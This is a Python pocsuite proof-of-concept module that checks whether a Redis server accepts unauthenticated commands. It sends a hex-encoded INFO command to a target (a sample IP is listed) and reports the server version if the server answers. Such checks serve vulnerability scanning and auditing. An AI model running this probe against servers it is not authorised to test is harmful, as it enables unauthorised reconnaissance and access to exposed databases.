#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
reload(sys)
sys.setdefaultencoding('utf8')
import socket
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '00002'
    version = '1'
    author = 'TideSec'
    vulDate = '2017-08-15'
    createDate = '2017-08-15'
    updateDate = '2017-08-15'
    references = ['http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/']
    name = 'Redis Unauthorized'
    appPowerLink = 'https://www.redis.io'
    appName = 'Redis'
    appVersion = 'All'
    vulType = 'Unauthorized'
    desc = 'redis 默认没有开启相关认证, 黑客直接访问即可获取数据库中所有信息.'
    samples = ['128.36.23.111']
    defaultPorts = [6379]
    defaultService = ['Redis key-value store', 'redis']

    def _verify(self):
        result = {}
        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(4)
        try:
            host = self.target.split(':')[0].strip('/')
            if len(self.target.split(':')) > 1:
                port = int(self.target.split(':')[1].strip('/'))
            else:
                port = 6379
            s.connect((host, port))
            s.send(payload)
            data = s.recv(1024)
            if data and 'redis_version' in data:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.url
                result['VerifyInfo']['port'] = port
                result['VerifyInfo']['result'] = data[:20]
        except Exception as e:
            print e
        s.close()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("someting error")
        return output


register(TestPOC)
